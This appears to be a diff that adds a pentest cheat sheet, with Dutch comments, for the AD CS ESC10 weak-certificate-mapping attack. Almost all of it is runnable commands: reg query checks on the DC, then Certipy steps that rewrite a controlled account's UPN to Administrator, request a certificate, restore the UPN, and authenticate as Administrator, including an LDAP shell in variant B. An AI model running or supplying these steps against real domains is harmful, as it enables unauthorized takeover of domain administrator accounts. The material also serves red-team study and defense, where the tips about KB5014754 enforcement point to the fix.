@@ -1,0 +1,26 @@
+# AD CS ESC10 - Weak Certificate Mappings
+# Twee varianten afhankelijk van registry settings op de DC
+# ESC10a: CertificateMappingMethods bevat UPN mapping (0x4) en StrongCertificateBindingEnforcement=0
+# ESC10b: CertificateMappingMethods bevat UPN mapping (0x4) zonder StrongCertificateBindingEnforcement
+# Variant A - StrongCertificateBindingEnforcement = 0
+# Stap 1: Check registry
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
+# Waarde 0 = kwetsbaar voor ESC10a
+# Stap 2: Aanvaller heeft GenericWrite op een account
+# Wijzig UPN van gecontroleerd account naar target (bijv. Administrator)
+certipy account update -u user@domain.local -p Password123! -user controlled_account -upn Administrator@domain.local
+# Stap 3: Request certificaat met de gewijzigde UPN
+certipy req -u controlled_account@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -template User
+# Stap 4: Zet UPN terug naar origineel
+certipy account update -u user@domain.local -p Password123! -user controlled_account -upn controlled_account@domain.local
+# Stap 5: Auth met certificaat (wordt gemapt op Administrator via UPN)
+certipy auth -pfx administrator.pfx -domain domain.local -dc-ip DC_IP
+# Variant B - CertificateMappingMethods met UPN bit (0x4)
+# Stap 1: Check registry
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\Schannel" /v CertificateMappingMethods
+# Bit 0x4 (UPN mapping) actief = kwetsbaar
+# Stap 2-5: Zelfde als variant A, maar werkt via Schannel in plaats van Kerberos
+# Gebruik LDAPS/Schannel voor authenticatie:
+certipy auth -pfx administrator.pfx -domain domain.local -dc-ip DC_IP -ldap-shell
+# Tip: ESC10 is vergelijkbaar met ESC9 maar afhankelijk van andere registry keys
+# Tip: Na KB5014754 full enforcement werkt dit niet meer
